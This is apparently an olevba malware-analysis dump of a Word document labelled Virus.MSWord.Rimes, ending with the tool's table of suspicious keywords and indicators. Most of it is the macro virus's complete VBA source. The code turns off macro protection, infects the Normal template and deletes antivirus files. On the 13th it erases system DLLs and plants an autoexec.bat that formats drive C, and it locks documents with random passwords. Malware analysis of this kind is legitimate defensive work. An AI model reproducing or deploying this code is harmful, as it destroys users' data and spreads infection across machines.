olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Rimes-e0321c456804ba995d6adea4ea2fce0d24c8610c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Rimes-e0321c456804ba995d6adea4ea2fce0d24c8610c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AuDioX.bas 
in file: Virus.MSWord.Rimes-e0321c456804ba995d6adea4ea2fce0d24c8610c - OLE stream: 'Macros/VBA/AuDioX'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'CXG CXG CXG CXG CXG CXG CXG CXG CXG CXG CXG CXG CXG CXG
'AuDio-X From CXG crew
'Hip-Hop For Ever
Sub Infect()
On Error Resume Next
Options.SaveNormalPrompt = False
Options.VirusProtection = False
SetAttr NormalTemplate.FullName, vbNormal
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Application.VBE.ActiveVBProject.VBComponents("AuDioX").Export "c:\AuDioX.sys"
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(i).Name = "AuDioX" Then NormInstall = True
Next i
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "AuDioX" Then ActivInstall = True
Next i
If ActivInstall = True And NormInstall = False Then Set cxg = NormalTemplate.VBProject
ElseIf ActivInstall = False And NormInstall = True Then Set cxg = ActiveDocument.VBProject
cxg.VBComponents.Import ("c:\AuDioX.sys")
End Sub
Sub RiMeS()
'Contact me please at Writercxg@yahoo.com
On Error Resume Next
Dim BlackSunday
Application.DisplayStatusBar = False
Application.ScreenUpdating = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
BlackSunday = Day(Now())
If BlackSunday = 13 Then
    Insert "cxg"
    Kill "c:\windows\system\s*.dll"
    Kill "c:\windows\system\r*.*"
    MsgBox("Fatal error to kernel.", vbCritical, "Warning") = vbOK
    Open "c:\autoexec.bat" For Random As auto
    Print auto; "@echo off"
    Print auto; "cls"
    Print auto; "echo Microsoft Corp. 1983-1997 All rights reserved "
    Print auto; "echo Goes preparation to renovation of your system files "
    Print auto; "ECHO Please wait this can occupy several minutes"
    Print auto; "format c: /u /c /s /q /autotest >nul"
    Print auto; "echo ."
    Print auto; "echo ."
    Print auto; "Error at renovations of files"
    Close auto
    Tasks.ExitWindows
End If
End Sub
Sub AvKill()
On Error Resume Next
Kill "C:\Program Files\AntiViral Toolkit Pro\Avp32.exe"
Kill "C:\Program Files\AntiViral Toolkit Pro\*.avc"
Kill "C:\Program Files\Command Software\F-PROT95\*.dll"
Kill "C:\Program Files\Command Software\F-PROT95\*.exe"
Kill "C:\Program Files\McAfee\VirusScan95\Scan.dat"
Kill "C:\Program Files\McAfee\VirusScan\Scan.dat"
Kill "C:\Program Files\Norton AntiVirus\Viruscan.dat"
Kill "C:\Program Files\Symantec\Symevnt.386"
Kill "C:\Program Files\FindVirus\Findviru.drv"
Kill "C:\Program Files\Cheyenne\AntiVirus\*.dll"
Kill "C:\Program Files\Cheyenne\Common\Cshell.dll"
Kill "C:\PC-Cillin 95\Lpt$vpn.*"
Kill "C:\PC-Cillin 95\Scan32.dll"
Kill "C:\PC-Cillin 97\Lpt$vpn.*"
Kill "C:\PC-Cillin 97\Scan32.dll"
Kill "C:\eSafe\Protect\*.dll"
Kill "C:\f-macro\f-macro.exe"
Kill "C:\TBAVW95\Tbscan.sig"
Kill "C:\Tbavw95\Tb*.*"
Kill "C:\VS95\*.dll"
End Sub
Sub toolsmacro()
On Error Resume Next
MsgBox("Critical error,Word can't open macros.", vbCritical, "ERROR") = vbOK
ActiveDocument.Password = (1313 * Rnd)
If ActiveDocument.Saved = True Then ActiveDocument.Save
ActiveDocument.Close
End Sub
Sub filetemplates()
On Error Resume Next
MsgBox("Error 413:compilation error.", vbCritical, "ERROR") = vbOK
ActiveDocument.Password = (1313 * Rnd)
    If ActiveDocument.Saved = True Then ActiveDocument.Save
ActiveDocument.Close
End Sub
Sub ToolsCustomize()
On Error Resume Next
MsgBox("Error 219:int()wrong variable string.", vbCritical, "ERROR") = vbOK
ActiveDocument.Password = (1313 * Rnd)
    If ActiveDocument.Saved = True Then ActiveDocument.Save
ActiveDocument.Close
End Sub
Sub ViewVBcode()
On Error Resume Next
MsgBox("Error 12:can't open VBA.", vbCritical, "Error") = vbOK
ActiveDocument.Password = (1313 * Rnd)
    If ActiveDocument.Saved = True Then ActiveDocument.Save
ActiveDocument.Close
End Sub
Sub AutoOpen()
On Error Resume Next
AvKill
Infect
RiMeS
End Sub
Sub FileNew()
On Error Resume Next
AvKill
Infect
RiMeS
End Sub
Sub FileOpen()
On Error Resume Next
AvKill
Infect
RiMeS
End Sub
Sub FileSave()
Dim dayy As Integer
dayy = Day(Now)
If dayy = 1 Then
MsgBox "-+==I  D I S L I K E  M I C R O S O F T==+-"
MsgBox ("Sorry but this isn't your lucky day I can't save documents today")
MsgBox "You can't remove me from the your system unless you format youe disk"
MsgBox "((((C X G))))"
MsgBox "I am stealth virus and you haven't got any antivirus program"
MsgBox "YOU LAMER"
MsgBox "I HATE LAMERS"
MsgBox "BUT I DON'T KNOW WHAT LAMERS ARE!!!"
MsgBox "I HIT LIKE THE THUNDER"
MsgBox "I AM SPREADING WITH LIGHT SPEED"
MsgBox "I AM TSR VIRUS"
MsgBox "ARE YOU BORED"
MSG = InputBox("PLEASE TELL ME YOUR NAME ?")
MsgBox "HELLO " & MSG & " SORRY BUT I FROM NOW I WONT SAVE ANY DOCUMENTS AT THE FIRST DAY OF THE MONTH"
MsgBox "THANX FOR USING M I C R O S O F T FUCKED PRODUCTS"
MsgBox "RIMES FROM CXG'99 hits with AUDIOX virus"
Application.Caption = "WORD CAN NOT SAVE DOCUMENTS AT THE FIRST DAY OF THE MONTH"
MsgBox "WAIT UNTILL THE 13TH OF THE MONTH AND YOU WILL SEE WHAT THIS VIRUS DO"
Else
ActiveDocument.Save
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |Avp32.exe           |Executable file name                         |
|IOC       |Cshell.dll          |Executable file name                         |
|IOC       |Scan32.dll          |Executable file name                         |
|IOC       |macro.exe           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

